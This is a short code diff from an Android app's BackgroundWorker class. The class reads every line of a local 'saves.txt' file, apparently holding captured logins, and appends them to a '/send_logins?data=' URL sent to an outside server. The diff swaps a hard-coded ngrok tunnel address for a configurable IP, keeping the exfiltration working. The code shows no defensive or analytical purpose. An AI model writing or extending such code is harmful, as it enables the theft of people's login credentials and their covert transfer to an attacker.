@@ -20,7 +20,7 @@ class BackgroundWorker extends AsyncTask<String, Void, Void> {
         try {
             File saves = new File(Activity2.getAppcontext().getFilesDir(), "saves.txt");
             Scanner scanner = new Scanner(new FileInputStream(saves));
-            String u = "http://395cfc6d.ngrok.io/send_logins?data=";
+            String u = MainActivity.getIp() + "/send_logins?data=";
             while (scanner.hasNextLine()) {
                 u += scanner.nextLine();
             }
